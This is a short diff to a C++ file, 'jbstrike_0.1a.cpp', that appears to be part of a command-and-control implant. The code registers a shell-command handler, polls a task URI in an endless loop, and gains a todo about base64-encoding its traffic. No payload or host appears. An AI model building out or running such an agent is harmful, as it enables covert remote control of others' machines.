@@ -1,5 +1,5 @@
 // jbstrike_0.1a.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
+//@todo add some sort of encryption, start with b64 because who cares.
 
 #include <iostream>
 #include <string>
@@ -29,7 +29,6 @@ int main()
 	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, std::placeholders::_1));
 	//cmdHandler.RegisterCommand(POWERSHELL_CMD, std::bind(&Agent::powershell, agent));
 	//cmdHandler.RegisterCommand(PSIMPORT_CMD, std::bind(&Agent::psimport, agent));
-
 
 	while (true) {
 		std::string task = agent.Get(TASK_URI);
